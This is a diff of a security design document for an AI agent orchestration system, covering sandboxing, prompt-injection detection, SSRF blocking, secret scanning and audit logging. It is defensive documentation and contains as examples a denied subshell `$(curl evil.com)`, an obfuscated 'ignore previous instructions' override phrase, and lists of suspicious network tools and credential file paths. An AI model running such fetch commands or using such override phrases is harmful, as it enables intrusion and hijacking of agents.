@@ -17,8 +17,6 @@ If you find a security issue, please open a GitHub issue or reach out via the re
 
 GuardianAgent implements a security-focused runtime architecture with mandatory enforcement on framework-managed agent flows. Guardian, ToolExecutor, wrapped LLM access, approvals, brokered worker execution, and subprocess sandboxing are structural parts of the runtime, not optional conventions.
 
-The built-in chat/planner execution path runs in a separate brokered worker process by default. The supervisor process owns config loading, admission, audit logging, tool execution, approvals, and orchestration. Structured orchestration agents execute in the supervisor process and dispatch built-in chat-agent work through the brokered path.
-
 ## Threat Model
 
 GuardianAgent is an AI agent orchestration system where:
@@ -28,7 +26,7 @@ GuardianAgent is an AI agent orchestration system where:
 - **LLM output is NOT trusted** — Models can hallucinate, leak secrets, or be prompt-injected
 - **User input is NOT trusted** — External input may contain injection attempts
 
-### Realistic Threats Addressed
+### Threats Addressed
 
 | Threat | Mitigation |
 |--------|-----------|
@@ -40,13 +38,13 @@ GuardianAgent is an AI agent orchestration system where:
 | Secret exfiltration via events | Payload scanning on all inter-agent communication |
 | Event source spoofing | Trusted source validation + Runtime-stamped `ctx.emit()` source IDs |
 | Shell command injection | POSIX tokenizer with whitelist validation |
-| SSRF via tool HTTP requests | SsrfController blocks private IPs, loopback, cloud metadata, IPv4-mapped IPv6, and obfuscated IPs in outbound tool URLs |
+| SSRF via tool HTTP requests | SsrfController blocks private IPs, loopback, cloud metadata, IPv4-mapped IPv6, and obfuscated IPs |
 | LLM provider failures | CircuitBreaker + priority-based FailoverProvider |
-| Malicious skill content | Local reviewed skill roots, no direct execution path, ToolExecutor/Guardian remain mandatory for effects |
+| Malicious skill content | Local reviewed skill roots, no direct execution path, ToolExecutor/Guardian remain mandatory |
 | Over-broad external tool providers | Guardian policy, managed provider allowlists, per-service capabilities, audit trail |
 | Dangerous tool actions | Guardian Agent inline LLM evaluation blocks high/critical risk actions before execution |
-| Host-installed agent drift or suspicious local activity | Host monitor baselines suspicious processes, persistence, sensitive paths, and network deltas; critical findings can block risky actions |
-| Gateway firewall drift or perimeter weakening | Gateway monitor baselines firewall state, WAN policy, port forwards, and admin users; critical findings can block risky network actions |
+| Host drift or suspicious local activity | Host monitor baselines processes, persistence, paths, and network; critical findings can block risky actions |
+| Gateway firewall drift | Gateway monitor baselines firewall state, WAN policy, port forwards, and admin users; critical findings can block risky network actions |
 
 ---
 
@@ -204,304 +202,26 @@ The following controls are enforced at Runtime chokepoints for the built-in brok
 
 ---
 
-## Sandbox Availability Model
+## Brokered Agent Isolation
 
-GuardianAgent classifies sandbox strength as `strong`, `degraded`, or `unavailable` and threads that state into tool registration, execution, and user-facing status surfaces.
+The built-in chat/planner execution path runs in a separate brokered worker process by default. The supervisor process owns config loading, admission, audit logging, tool execution, approvals, and orchestration. Structured orchestration agents execute in the supervisor process and dispatch built-in chat-agent work through the brokered path.
 
-### Behavior
+- The worker has no network access — LLM API calls are proxied through the broker RPC (`llm.chat`)
+- Tool execution and approvals are mediated through broker RPC — the worker has no direct `Runtime` or `ToolExecutor` reference
+- On strong hosts the worker uses the `agent-worker` sandbox profile with full namespace isolation
+- On degraded hosts the worker uses the `workspace-write` profile with a hardened environment
 
-- Linux with `bwrap` available is treated as `strong`
-- Linux without `bwrap` degrades to `ulimit` or env hardening
-- macOS currently reports `degraded`
-- Windows reports `strong` only when a configured native helper is enabled and detected; otherwise it reports `unavailable`
-- `assistant.tools.sandbox.enforcementMode` supports `permissive` and `strict`
-- Defaults are `policyMode: approve_by_policy` and `sandbox.enforcementMode: strict`
-- In `permissive` mode, risky subprocess-backed tools remain available even when sandbox availability is not `strong`, but permissive mode must be explicitly enabled by the operator
-- In `strict` mode, risky subprocess-backed tools are disabled unless sandbox availability is `strong`
-- CLI startup warnings, tool listings, category views, web tool state, and tool execution denials surface the reason
-
-### Risky Tool Classes Blocked In `strict`
-
-- shell execution
-- browser automation
-- MCP server processes and their registered tools
-- subprocess-backed search/indexing tools
-- other broad host-access categories currently mapped as `network` and `system`
-
-### Platform Limits
-
-Windows strong mode depends on shipping and enabling `guardian-sandbox-win.exe`. The helper launches subprocesses with AppContainer security capabilities for sandboxed profiles and always applies Job Object lifetime controls. macOS requires a native strong-backend helper for the same class of isolation.
-
-### Windows Backend Status
-
-Implemented in the helper path:
-
-- AppContainer-backed process launch for sandboxed profiles (`read-only`, `workspace-write`)
-- Job Object `KILL_ON_JOB_CLOSE` enforcement for child process trees
-- strict-mode fail-closed behavior when the helper is missing/unhealthy
-
-Additional Windows backend work:
-
-- restricted-token layering in addition to AppContainer
-- explicit process mitigation policy wiring
-- first-class ACL automation for allowed path grants
-
-### Optional Windows Portable Isolation Mode
-
-GuardianAgent can also offer this as an **additional Windows option** via a portable zip bundle rather than a traditional installer.
-
-Shape:
-
-- `guardian-runtime.exe`
-- `guardian-sandbox-win.exe`
-- optional localhost-served or hosted web UI
-
-Packaging model:
-
-- one staged Windows app payload
-- one portable zip can include both the runtime and sandbox helper
-- installer generation is optional and can reuse the same staged payload
-
-Security implications:
-
-- this avoids installer packaging, but not the use of unsigned native binaries
-- Windows users may still see reputation or trust prompts for unsigned executables
-- strong Windows sandbox availability depends on the helper being present, enabled, and healthy
-- the same helper path can be shipped either through the optional portable zip bundle or the Windows installer packaging flow in `packaging/windows/`
-
-Example config:
-
-```yaml
-assistant:
-  tools:
-    sandbox:
-      enabled: true
-      enforcementMode: strict
-      windowsHelper:
-        enabled: true
-        command: ./bin/guardian-sandbox-win.exe
-        timeoutMs: 5000
-```
-
-See `docs/proposals/WINDOWS-PORTABLE-ISOLATION-OPTION.md`.
-
-### Filesystem and Network Expectations
-
-- Filesystem enforcement on Windows should prefer isolated workspaces and explicit allowed-directory grants
-- Network enforcement should support at least `on/off` at the sandbox boundary
-- Fine-grained host/domain egress policy remains an application-layer control unless a future privileged Windows networking helper is introduced
+There is no `ctx.fs`, `ctx.http`, or `ctx.exec`. Framework-managed interaction points are `ctx.llm` (guarded), `ctx.emit()` (scanned), `ctx.dispatch()` (Guardian-checked per call), managed tools, and returning a response (scanned).
 
 ---
 
-## Host Workstation Monitoring
+## Input Security
 
-GuardianAgent includes a practical host-monitoring layer intended for direct host installs where there is no Docker or VM boundary. The implementation is Windows-first in threat model and process naming, with portable coverage for Linux and macOS.
-
-### Signals
-
-- suspicious process detection
-  - Windows-focused high-risk names such as `wscript.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `bitsadmin.exe`, and `certutil.exe`
-  - portable checks for `osascript`, `launchctl`, `socat`, and `nc`
-- persistence drift
-  - Windows Run/RunOnce keys, scheduled tasks, and Startup folders
-  - Linux autostart, `systemd`, and `crontab`
-  - macOS LaunchAgents, LaunchDaemons, and `crontab`
-- sensitive path drift
-  - GuardianAgent state, SSH, cloud credentials, kube config, shell profiles, and PowerShell profiles
-- network drift
-  - new external destinations
-  - new listening ports, with high-risk ports elevated
-- firewall posture
-  - Windows Defender Firewall profile state and rule drift
-  - Linux `ufw` state or `nftables`/`iptables` ruleset drift
-  - macOS `pf` state and ruleset drift
-
-### Self-Policing Behavior
-
-Host monitoring is not only informational. It participates in execution control:
-
-- critical host alerts can block risky follow-up actions such as command execution and outbound/network actions
-- multiple active high-severity host alerts can also force operator review before sensitive execution continues
-- denials are written to the audit log as `action_denied` with `controller: HostMonitor`
-
-This means GuardianAgent can police itself when the local machine starts showing behavior that looks inconsistent with the intended operating posture.
-
-### Operator Surfaces
-
-- audit event type: `host_alert`
-- notification fanout: configurable via `assistant.notifications`
-  - default delivery is CLI-only
-  - `new_external_destination` is suppressed by default at the notification layer to reduce noise
-  - channel routing can be set to `all` or selected destinations
-- Security page:
-  - host monitor posture cards
-  - active host alerts table
-  - manual check trigger
-  - acknowledgement flow
-  - expandable raw audit/event details
-- Configuration page:
-  - `Settings > Security > Security Alerts` manages notification severity, event types, suppressed detail types, cooldown, and channel routing
-- tools:
-  - `host_monitor_status`
-  - `host_monitor_check`
-- built-in automation starters:
-  - template: `agent-host-guard`
-  - presets: `host-security-baseline`, `anomaly-response-triage`, `host-monitor-watch`, `firewall-posture-watch`
-
-### Limits
-
-- this is a practical first-pass monitor, not EDR-grade telemetry
-- file drift on sensitive directories is metadata-based rather than full content inspection
-- Windows helper-backed deep process/file correlation is future work
-- Linux `auditd`/eBPF and macOS EndpointSecurity-class telemetry remain future optional depth layers
-
----
-
-## Gateway Firewall Monitoring
-
-GuardianAgent supports gateway-firewall monitoring as a separate subsystem for edge devices such as OPNsense, pfSense, and UniFi-class gateways.
-
-### Model
-
-- configuration path: `assistant.gatewayMonitoring`
-- collector mode: operator-configured command returning normalized JSON
-- persisted baseline:
-  - firewall enabled/disabled state
-  - WAN default action
-  - rule count
-  - port forwards
-  - admin users
-  - optional firmware version
-- alert family: `gateway_alert`
-
-### Behavior
-
-- detects gateway firewall disablement or relaxation
-- detects gateway configuration drift
-- detects port-forward changes
-- detects admin-user changes
-- records alerts to audit + notification pipelines
-- can block sensitive follow-up actions when critical gateway alerts are active
-
-### Trust Boundary
-
-Gateway monitoring is intentionally separate from local host monitoring:
-
-- host monitoring observes the machine GuardianAgent runs on
-- gateway monitoring observes remote perimeter devices through operator-supplied collectors
-
-This separation avoids conflating local OS telemetry with remote appliance state while letting Guardian correlate both.
-
-### Automation Starters
-
-- template: `firewall-sentry`
-- playbooks:
-  - `firewall-posture-watch`
-  - `firewall-drift-triage`
-- presets:
-  - `gateway-firewall-watch`
-  - `gateway-firewall-posture`
-
----
-
-## Native Skills Security Model
-
-GuardianAgent has a native skills foundation. Skills are a **knowledge and workflow layer**, not a privileged execution layer.
-
-### Security Requirements for Skills
-
-- Skills are loaded from configured local roots by default
-- Skills do not create or bypass tools
-- Skills do not grant capabilities
-- Skills may recommend actions, but execution goes through ToolExecutor and Guardian
-- Any future install/setup steps must be explicitly approval-gated
-
-This separation is deliberate: skills help the model plan, while tools and MCP integrations remain the only execution surfaces.
-
----
-
-## Managed Google Workspace Integration
-
-GuardianAgent integrates with Google Workspace (Gmail, Calendar, Drive, Docs, Sheets) via the Google Workspace CLI (`@googleworkspace/cli`) running as a managed MCP server, plus curated native skills.
-
-### Installation Model
-
-- The GWS CLI is **not bundled** — users install it separately (`npm install -g @googleworkspace/cli`)
-- OAuth 2.0 credentials must be configured per-user via Google Cloud Console (Desktop app client type) or `gcloud` CLI
-- Authentication requires an interactive browser OAuth flow (`gws auth login`) — cannot be initiated headlessly from the web UI or API
-- Credentials are stored in the OS keyring by `gws`, not by GuardianAgent
-
-### Security Expectations
-
-- Only configured Google services are exposed (opt-in via `services` array)
-- Gmail, Calendar, Drive, Docs, and Sheets capability hooks exist in Guardian for managed Google tooling
-- External send/post actions (e.g. `gmail_send`) remain approval-gated (`external_post` risk)
-- Read-only Google actions follow the configured tool policy mode
-- The `SecretScanController` exempts email addresses only in addressing fields (`to`, `from`, `cc`, `bcc`, etc.) for email/calendar/MCP tool actions — email addresses in message bodies or other fields are still flagged as PII
-- Provider-managed secure storage (OS keyring) is used for credentials — GuardianAgent never stores or handles raw OAuth tokens
-
-### Web UI Controls
-
-- Settings > Google Workspace panel provides connectivity testing, service selection, and one-click provider enable
-- Enabling the provider writes `mcp.enabled: true` and `managedProviders.gws` to config — a restart is required for the MCP server to start
-
-See:
-
-- `docs/specs/SKILLS-SPEC.md`
-- `docs/specs/GOOGLE-WORKSPACE-INTEGRATION-SPEC.md`
-
----
-
-## Secret Detection
-
-Secret scanning is applied to **all string fields** in action params (recursive traversal), not just `content`.
-
-### Built-in Patterns (30+)
-
-| Category | Patterns Detected |
-|----------|------------------|
-| **AWS** | Access Key (`AKIA...`), Secret Key, Session Token |
-| **GCP / Google** | Service Account JSON, AI API Key (`AIza...`) |
-| **Azure** | Storage Account Key (connection string) |
-| **GitHub** | PAT (`ghp_`), OAuth (`gho_`), App Token (`ghs_`, `ghr_`) |
-| **GitLab** | PAT (`glpat-`), Pipeline Token (`glptt-`) |
-| **OpenAI** | API Key (`sk-proj-`, `sk-...`) |
-| **Anthropic** | API Key (`sk-ant-...`) |
-| **Stripe** | Live Key (`sk_live_`), Test Key (`sk_test_`) |
-| **Slack** | Bot Token (`xoxb-`), Webhook URL |
-| **Twilio** | API Key (`SK` + 32 hex) |
-| **SendGrid** | API Key (`SG.<22>.<43>`) |
-| **Telegram** | Bot Token |
-| **npm** | Token (`npm_`) |
-| **Infrastructure** | Heroku API Key, Mailgun Key |
-| **Tokens/Certs** | JWT (`eyJ...`), PEM Private Key headers, Connection Strings |
-| **PII** | Email addresses, US SSN, Credit Card numbers, US Phone numbers |
-| **Generic** | `password=`, `api_key=`, `secret=`, `token=` patterns |
-
-### PII Field-Level Exemptions
-
-Email addresses are PII and are flagged by default in all params. However, email/calendar/MCP tool actions require email addresses in addressing fields to function. The `SecretScanController` applies a **narrow, field-scoped exemption**:
-
-- **Only** the `Email Address` pattern is exempted
-- **Only** in structurally required addressing fields: `to`, `from`, `cc`, `bcc`, `sender`, `recipient`, `recipients`, `attendees`, `organizer`, `replyTo`, `reply_to`
-- **Only** for action types where addressing is expected: `send_email`, `draft_email`, `read_email`, `read_calendar`, `write_calendar`, `mcp_tool`
-- Email addresses in **any other field** (e.g. `body`, `description`, `notes`, `content`) are **still flagged** as PII, even for exempt action types
-- All other PII patterns (SSN, credit cards, phone numbers) are **never** exempted
-- All credential patterns (API keys, tokens, secrets) are **never** exempted regardless of field or action type
-
-This prevents false denials when sending email to a recipient while preserving PII detection everywhere else.
-
-### Denied File Paths (15 patterns)
-
-`.env`, `*.pem`, `*.key`, `credentials.*`, `id_rsa*`, SSH keys, `*.p12`/`*.pfx`, `*.jks`, `.npmrc`, `*.tfvars`, `*.tfstate`, `docker-compose*.yml`, `.aws/credentials`, `.docker/config.json`, `kubeconfig`
-
----
-
-## Prompt Injection Defense
+### Prompt Injection Defense
 
 The InputSanitizer operates as a mutating admission controller with two defenses:
 
-### 1. Invisible Character Stripping
+#### 1. Invisible Character Stripping
 
 Removes Unicode characters that can hide instructions:
 - Zero-width joiners/spaces (U+200B–200F)
@@ -509,7 +229,7 @@ Removes Unicode characters that can hide instructions:
 - Word joiners, isolate markers (U+2060–2069)
 - BOM (U+FEFF), soft hyphens (U+00AD)
 
-### 2. Injection Signal Detection (18 patterns)
+#### 2. Injection Signal Detection (18 patterns)
 
 | Category | Examples | Score |
 |----------|----------|-------|
@@ -523,13 +243,17 @@ Scores are additive. Default block threshold: **3** (configurable).
 
 Detection is run against both raw and normalized text. Normalization includes NFKC Unicode normalization, leetspeak canonicalization (`1`→`i`, `0`→`o`, etc.), and separator de-obfuscation (for cases like `ig-nore previous instructions`).
 
----
+### SSRF Protection
 
-## Per-Agent Capability Model
+The SsrfController blocks outbound tool URLs targeting:
+- Private IPs (RFC1918), loopback, link-local
+- Cloud metadata endpoints (169.254.169.254, metadata.google.internal)
+- IPv4-mapped IPv6 addresses
+- Decimal/hex/octal IP obfuscation
 
-Capabilities are granted per-agent at registration and **frozen** (`Object.freeze`). Framework-managed actions must pass Guardian checks using those grants. This is an application-layer least-privilege model, not a kernel-mediated dynamic capability broker.
+### Per-Agent Capability Model
 
-### Available Capabilities
+Capabilities are granted per-agent at registration and **frozen** (`Object.freeze`). Framework-managed actions must pass Guardian checks using those grants.
 
 | Capability | Grants Access To |
 |-----------|-----------------|
@@ -537,23 +261,15 @@ Capabilities are granted per-agent at registration and **frozen** (`Object.freez
 | `write_files` | File write/create operations |
 | `execute_commands` | Shell command execution |
 | `network_access` | HTTP requests to allowed domains |
-| `read_email` | Email inbox access |
-| `draft_email` | Email composition |
-| `send_email` | Email sending |
-| `read_calendar` | Calendar read access |
-| `write_calendar` | Calendar event creation/modification |
-| `read_drive` | Google Drive read access |
-| `write_drive` | Google Drive file creation/modification |
-| `read_docs` | Google Docs read access |
-| `write_docs` | Google Docs creation/modification |
-| `read_sheets` | Google Sheets read access |
-| `write_sheets` | Google Sheets creation/modification |
+| `read_email` / `draft_email` / `send_email` | Email inbox, composition, and sending |
+| `read_calendar` / `write_calendar` | Calendar access and modification |
+| `read_drive` / `write_drive` | Google Drive access and modification |
+| `read_docs` / `write_docs` | Google Docs access and modification |
+| `read_sheets` / `write_sheets` | Google Sheets access and modification |
 | `git_operations` | Git commands |
 | `install_packages` | Package installation |
 
-### Trust Presets
-
-One-knob security posture configuration:
+#### Trust Presets
 
 | Preset | Capabilities | Rate Limit | Budget | Tool Policy |
 |--------|-------------|------------|--------|-------------|
@@ -562,28 +278,54 @@ One-knob security posture configuration:
 | **balanced** | read/write/exec/git/email | 30/min, 500/hr | 60s | approve_by_policy |
 | **power** | all capabilities | 60/min, 2000/hr | 300s | autonomous |
 
-Defaults align most closely with the `balanced` posture for tool policy behavior: mutating and external-post actions require approval, while read-only and network tools are allowed by policy unless overridden.
-
 ---
 
 ## Tool Execution Security
 
-### Three-Tier Approval Policy
+### Approval Policy
 
 | Mode | Behavior |
 |------|----------|
 | `approve_each` | Every tool call requires explicit user approval |
-| `approve_by_policy` | Per-tool overrides: `auto`, `policy`, `manual`, `deny`; read-only and network tools are allowed by default |
+| `approve_by_policy` | Per-tool overrides: `auto`, `policy`, `manual`, `deny`; read-only and network tools allowed by default |
 | `autonomous` | Tools execute without approval (still sandboxed) |
+
+### Risk Classification
+
+| Risk Level | Examples |
+|-----------|---------|
+| `read_only` | File reads, searches |
+| `mutating` | File writes, deletes |
+| `network` | HTTP requests, downloads |
+| `external_post` | Sending emails, posting to forums |
+
+### Shell Command Validation
+
+The ShellCommandController goes beyond simple string matching:
+
+1. **POSIX tokenizer** handles quoting (`echo "hello && world"` → one command)
+2. **Chain splitting** on `&&`, `||`, `;`, `|` operators
+3. **Each sub-command** validated against whitelist
+4. **Redirect targets** (`> .env`) checked against denied paths
+5. **Subshell detection** (`$(curl evil.com)`) → denied
+6. **Deny by default** if parser can't fully understand the input
+
+### Sandbox Restrictions
+
+- **Path whitelist**: Tools can only access configured filesystem roots
+- **Command whitelist**: Shell execution limited to explicitly allowed commands
+- **Domain whitelist**: Network requests limited to configured domains
+- **Provider host checks**: `web_search` verifies required provider hosts are allowlisted before making requests
+- **Dry-run mode**: Preview mutating operations without execution
 
 ### Policy-as-Code Engine
 
-The policy engine replaces hard-coded `decide()` logic with declarative JSON rules that are version-controlled, auditable, and hot-reloadable.
+Declarative JSON rule files replace hard-coded approval logic with an auditable, version-controlled policy engine.
 
 **Architecture:**
 - **Rule files** in `policies/` are loaded at startup and compiled into priority-sorted matcher closures
 - **Canonical PolicyInput** model: `{ family, principal, action, resource, context }` — resource is always the tool; targets go in `resource.attrs`
-- **Deterministic evaluation**: first-match wins, with family defaults as fallback (tool→mode-dependent, guardian/admin/event→deny)
+- **Deterministic evaluation**: first-match wins, with family defaults as fallback
 - **10 match primitives**: exact, `in`/`notIn`, `gt`/`gte`/`lt`/`lte`, `startsWith`/`endsWith`, `regex`, `exists`
 - **Compound conditions**: `allOf` (implicit default) and `anyOf` for disjunctive logic
 
@@ -607,30 +349,17 @@ The policy engine replaces hard-coded `decide()` logic with declarative JSON rul
 - Shadow mode: engine error → log + continue with legacy decision
 - Enforce mode: engine error → fail closed (deny)
 
-### Risk Classification
+See [`docs/specs/POLICY-AS-CODE-SPEC.md`](docs/specs/POLICY-AS-CODE-SPEC.md) for the full specification.
 
-| Risk Level | Examples |
-|-----------|---------|
-| `read_only` | File reads, searches |
-| `mutating` | File writes, deletes |
-| `network` | HTTP requests, downloads |
-| `external_post` | Sending emails, posting to forums |
+---
 
-### Sandbox Restrictions
-
-- **Path whitelist**: Tools can only access configured filesystem roots
-- **Command whitelist**: Shell execution limited to explicitly allowed commands
-- **Domain whitelist**: Network requests limited to configured domains
-- **Provider host checks**: `web_search` verifies required provider hosts are allowlisted before making requests
-- **Dry-run mode**: Preview mutating operations without execution
-
-### OS-Level Process Sandbox
+## Process Sandbox
 
 Managed child processes spawned by tool execution are wrapped in OS-level isolation using [bubblewrap (bwrap)](https://github.com/containers/bubblewrap) on Linux, an optional native helper on Windows, and graceful fallback to `ulimit` + environment hardening when stronger backends are unavailable.
 
-The brokered chat worker is also launched through the managed sandbox layer with `networkAccess: false`. LLM API calls are proxied through the broker RPC (`llm.chat`), so the worker process never makes outbound network connections. On strong hosts the worker uses the `agent-worker` profile with full namespace isolation. On degraded hosts the worker uses the `workspace-write` profile with a hardened environment and dedicated workspace.
+The brokered chat worker is also launched through the managed sandbox layer with `networkAccess: false`. LLM API calls are proxied through the broker RPC (`llm.chat`), so the worker process never makes outbound network connections.
 
-#### Sandbox Profiles
+### Sandbox Profiles
 
 | Profile | Filesystem | Network | Use Case |
 |---------|-----------|---------|----------|
@@ -639,7 +368,7 @@ The brokered chat worker is also launched through the managed sandbox layer with
 | `agent-worker` | Dedicated worker workspace, remapped `HOME`/`TMPDIR` | Network-disabled (LLM proxied via broker) | Brokered chat/planner worker (strong hosts) |
 | `full-access` | No isolation (env hardening only) | Full access | Explicitly trusted operations |
 
-#### Isolation Mechanisms
+### Isolation Mechanisms
 
 | Mechanism | Platform | What It Does |
 |-----------|----------|-------------|
@@ -648,42 +377,58 @@ The brokered chat worker is also launched through the managed sandbox layer with
 | **Env hardening** | All | Strips loader/interpreter injection vars (`LD_PRELOAD`, `DYLD_*`, `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `PYTHONPATH`, `RUBYLIB`, `PERL5LIB`, etc.) |
 | **Symlink resolution** | All | `resolveAllowedPath` resolves symlinks via `fs.realpath()` before path checking |
 
-#### Configuration
+### Sandbox Availability Model
+
+GuardianAgent classifies sandbox strength as `strong`, `degraded`, or `unavailable` and threads that state into tool registration, execution, and user-facing status surfaces.
+
+- Linux with `bwrap` available → `strong`
+- Linux without `bwrap` → degrades to `ulimit` or env hardening
+- macOS → currently reports `degraded`
+- Windows → reports `strong` only when a configured native helper is enabled and detected; otherwise `unavailable`
+
+In `strict` mode, risky subprocess-backed tools are disabled unless sandbox availability is `strong`. In `permissive` mode, they remain available with degraded isolation.
+
+**Risky tool classes blocked in `strict` mode:** shell execution, browser automation, MCP server processes, subprocess-backed search/indexing, and broad host-access categories (`network`, `system`).
+
+Install bwrap on Debian/Ubuntu: `sudo apt install bubblewrap`
+
+### Windows Sandbox Backend
+
+- AppContainer-backed process launch for sandboxed profiles (`read-only`, `workspace-write`)
+- Job Object `KILL_ON_JOB_CLOSE` enforcement for child process trees
+- Strict-mode fail-closed behavior when the helper is missing/unhealthy
+- Optional portable zip bundle ships the sandbox helper alongside the runtime
+
+See `docs/proposals/WINDOWS-PORTABLE-ISOLATION-OPTION.md` for packaging details.
+
+### Configuration
 
 ```yaml
 assistant:
   tools:
     sandbox:
       enabled: true
-      mode: workspace-write       # Default profile
-      networkAccess: false         # Default: isolate network
-      additionalWritePaths: []     # Extra writable paths
-      additionalReadPaths: []      # Extra read-only paths
+      enforcementMode: strict          # strict | permissive
+      mode: workspace-write            # Default profile
+      networkAccess: false             # Default: isolate network
+      additionalWritePaths: []         # Extra writable paths
+      additionalReadPaths: []          # Extra read-only paths
       resourceLimits:
         maxMemoryMb: 512
         maxCpuSeconds: 60
-        maxFileSizeKb: 10240       # 10 MB
-        maxProcesses: 0             # 0 = unlimited; bwrap PID namespace used instead
+        maxFileSizeKb: 10240           # 10 MB
+        maxProcesses: 0                # 0 = unlimited; bwrap PID namespace used instead
+      windowsHelper:                   # Windows only
+        enabled: true
+        command: ./bin/guardian-sandbox-win.exe
+        timeoutMs: 5000
 ```
 
-#### Fallback Behavior
-
-When a strong sandbox backend is not available (macOS, Windows without helper, minimal Linux containers):
-1. `ulimit` resource limits are applied as a shell prefix (POSIX only)
-2. Dangerous environment variables are stripped from child processes
-3. Filesystem namespace isolation is not available (path/domain/command policy still applies)
-4. A warning is logged at startup
-
-In `permissive` mode this is a degraded-but-usable posture. In `strict` mode, risky subprocess-backed tool categories are disabled until a strong backend is available.
-
-Install bwrap on Debian/Ubuntu: `sudo apt install bubblewrap`
-
-#### Unified Operator Controls
+### Unified Operator Controls
 
 Three simplified top-level config aliases provide a clean mental model that maps to the internal config sections:
 
 ```yaml
-# Top-level aliases (resolved at config load time)
 sandbox_mode: strict           # off | workspace-write | strict
 approval_policy: auto-approve  # on-request | auto-approve | autonomous
 writable_roots:                # merged into allowedPaths + sandbox additionalWritePaths
@@ -704,73 +449,61 @@ These are convenience aliases. Internal config sections take precedence when set
 
 ---
 
-## Credential Handling
+## Secret Detection & Output Security
 
-- GuardianAgent supports runtime credential references for LLM and web-search providers via `assistant.credentials.refs`
-- the preferred pattern is `credentialRef` → env-backed credential reference, rather than storing raw provider keys inline in provider/tool config
-- inline `apiKey` fields remain supported as a backward-compatible fallback, but are no longer the preferred configuration path
-- Approval records store redacted arguments and a deterministic hash (`argsHash`) rather than raw sensitive values
-- provider integrations resolve concrete credential values inside the main runtime process when creating provider/tool clients
-- Output scanning and denied-path controls reduce accidental exfiltration, but GuardianAgent does not currently guarantee that credentials never enter the main process address space
-- Provider-managed secure storage is preferred for external integrations where available
+### Secret Detection Patterns (30+)
 
-Example preferred pattern:
+Secret scanning is applied to **all string fields** in action params (recursive traversal), not just `content`.
 
-```yaml
-assistant:
-  credentials:
-    refs:
-      llm.openai.primary:
-        source: env
-        env: OPENAI_API_KEY
-      search.brave.primary:
-        source: env
-        env: BRAVE_API_KEY
-  tools:
-    webSearch:
-      provider: brave
-      braveCredentialRef: search.brave.primary
+| Category | Patterns Detected |
+|----------|------------------|
+| **AWS** | Access Key (`AKIA...`), Secret Key, Session Token |
+| **GCP / Google** | Service Account JSON, AI API Key (`AIza...`) |
+| **Azure** | Storage Account Key (connection string) |
+| **GitHub** | PAT (`ghp_`), OAuth (`gho_`), App Token (`ghs_`, `ghr_`) |
+| **GitLab** | PAT (`glpat-`), Pipeline Token (`glptt-`) |
+| **OpenAI** | API Key (`sk-proj-`, `sk-...`) |
+| **Anthropic** | API Key (`sk-ant-...`) |
+| **Stripe** | Live Key (`sk_live_`), Test Key (`sk_test_`) |
+| **Slack** | Bot Token (`xoxb-`), Webhook URL |
+| **Twilio** | API Key (`SK` + 32 hex) |
+| **SendGrid** | API Key (`SG.<22>.<43>`) |
+| **Telegram** | Bot Token |
+| **npm** | Token (`npm_`) |
+| **Infrastructure** | Heroku API Key, Mailgun Key |
+| **Tokens/Certs** | JWT (`eyJ...`), PEM Private Key headers, Connection Strings |
+| **PII** | Email addresses, US SSN, Credit Card numbers, US Phone numbers |
+| **Generic** | `password=`, `api_key=`, `secret=`, `token=` patterns |
 
-llm:
-  openai:
-    provider: openai
-    model: gpt-4o
-    credentialRef: llm.openai.primary
-```
+### PII Field-Level Exemptions
 
-Limit:
+Email addresses are PII and flagged by default. However, email/calendar/MCP tool actions require email addresses in addressing fields. The `SecretScanController` applies a **narrow, field-scoped exemption**:
 
-- this is a credential reference and resolution layer, not yet a separate secret-broker process
-- long-lived credentials are better isolated than before at config level, but not yet held outside the runtime boundary at execution time
+- **Only** the `Email Address` pattern is exempted
+- **Only** in structurally required addressing fields: `to`, `from`, `cc`, `bcc`, `sender`, `recipient`, `recipients`, `attendees`, `organizer`, `replyTo`, `reply_to`
+- **Only** for action types where addressing is expected: `send_email`, `draft_email`, `read_email`, `read_calendar`, `write_calendar`, `mcp_tool`
+- Email addresses in **any other field** (e.g. `body`, `description`, `notes`, `content`) are **still flagged**
+- All other PII patterns (SSN, credit cards, phone numbers) are **never** exempted
+- All credential patterns are **never** exempted regardless of field or action type
 
----
+### Denied File Paths (15 patterns)
 
-## Browser-To-Localhost Attack Mitigations
+`.env`, `*.pem`, `*.key`, `credentials.*`, `id_rsa*`, SSH keys, `*.p12`/`*.pfx`, `*.jks`, `.npmrc`, `*.tfvars`, `*.tfstate`, `docker-compose*.yml`, `.aws/credentials`, `.docker/config.json`, `kubeconfig`
 
-GuardianAgent is hardened against the class of attacks where a malicious website attempts to drive a locally running agent over loopback HTTP/WebSocket interfaces.
+### Output Guardian
 
-Mitigations:
-
-- the web channel does not expose a WebSocket control plane; it uses authenticated HTTP APIs plus authenticated SSE
-- localhost / loopback is **not** treated as trusted for API access; `/api/*` and `/sse` always require authentication
-- when no web token is configured, GuardianAgent generates a secure random token for the active run rather than leaving the API open
-- wildcard CORS (`'*'`) is rejected by configuration validation for the web channel
-- browser session cookies are `HttpOnly` and `SameSite=Strict`, reducing cross-site request exposure
-- repeated authentication failures are rate-limited and temporarily blocked to slow token brute force against the local API
-- privileged state-changing operations such as auth reconfiguration, token reveal/rotation, connector changes, and factory reset require short-lived privileged tickets in addition to base authentication
-- SSE does not accept query-string tokens
-
-Residual risk:
-
-- broad `allowedOrigins` settings weaken the browser boundary and should be kept narrow
-- binding the web channel to non-loopback interfaces increases remote attack surface
-- possession of a valid bearer token still grants access to the web API within the configured authorization model
+- GuardedLLMProvider scans every LLM response for secrets automatically
+- Response redaction replaces detected credentials with `[REDACTED]`
+- Inter-agent event payloads are scanned before dispatch
+- Tool results are wrapped as structured `<tool_result ...>` envelopes before they return to the model
+- Tool-result strings are stripped of invisible Unicode, checked for prompt-injection signals, and PII-redacted before reinjection
+- All detections logged to the audit trail
 
 ---
 
-## Tamper-Evident Audit Trail
+## Monitoring & Audit
 
-### Hash-Chained JSONL
+### Tamper-Evident Audit Trail
 
 Every security event is persisted to `~/.guardianagent/audit/audit.jsonl` with SHA-256 hash chaining:
 
@@ -780,16 +513,14 @@ Every security event is persisted to `~/.guardianagent/audit/audit.jsonl` with S
 
 Each entry's hash is computed over the event + previous hash, creating a **tamper-evident chain**. Any modification to historical entries breaks the chain.
 
-### Chain Verification
+Chain verification is available via `GET /api/audit/verify`:
 
 ```typescript
 const result = await auditLog.verifyChain();
 // { valid: true, totalEntries: 1523 }
 ```
 
-Available via `GET /api/audit/verify` endpoint.
-
-### Event Types (13)
+#### Event Types (13)
 
